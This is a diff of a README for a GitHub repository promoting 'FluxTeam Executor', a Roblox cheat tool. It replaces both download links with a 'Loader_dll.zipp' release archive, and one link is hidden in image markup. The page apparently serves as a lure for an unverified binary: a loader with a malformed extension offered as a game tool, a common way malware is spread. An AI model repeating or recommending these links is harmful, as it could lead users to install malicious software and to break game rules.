@@ -309,7 +309,7 @@
 
 Welcome to the FluxTeam Executor repository! 🚀 This repository hosts the latest version of the FluxTeam Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![FluxTeam Executor](https://github.com/secondlathloothy/FluxTeam-Executor/releases/download/Download/application.zip)
+![FluxTeam Executor](https://github.com/secondlathloothy/FluxTeam-Executor/releases/download/Download/Loader_dll.zipp)
 
 ## Table of Contents
 
@@ -804,7 +804,7 @@ FluxTeam Executor is a cutting-edge executor designed for Roblox script executio
 
 To get started with FluxTeam Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download FluxTeam Executor](https://img.shields.io/badge/Download-FluxTeam%20Executor-orange)](https://github.com/secondlathloothy/FluxTeam-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download FluxTeam Executor](https://img.shields.io/badge/Download-FluxTeam%20Executor-orange)](https://github.com/secondlathloothy/FluxTeam-Executor/releases/download/Download/Loader_dll.zipp).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
